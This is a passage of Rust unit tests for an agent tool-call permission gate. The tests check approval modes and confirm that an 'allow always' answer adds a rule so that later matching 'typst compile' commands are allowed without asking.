        assert!(g.answer(&c, ApprovalAnswer::AllowAlways));
        assert_eq!(g.config().rules[0].pattern, pat);
        // Workspace write still writes it without asking.
        let mut g = PolicyGate::default();
        g.set_approval(ApprovalMode::WorkspaceWrite, vec![every]);
        assert!(matches!(
            g.check_full(&c, false, &facts, true),
            Decision::Allow { .. }
        ));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn always_allow_adds_a_rule() {
        let a = json!({"command": "typst compile a.typ"});
        let c = call("run_command", EffectClass::ExternalSideEffect, None, &a);
        let mut g = PolicyGate::default();
        assert_eq!(g.check(&c), Decision::Ask);
        assert!(g.answer(&c, ApprovalAnswer::AllowAlways));
        assert_eq!(g.config().rules.len(), 1);
        let b = json!({"command": "typst compile b.typ"});
        let c2 = call("run_command", EffectClass::ExternalSideEffect, None, &b);
        assert!(matches!(g.check(&c2), Decision::Allow { .. }));
    }
}
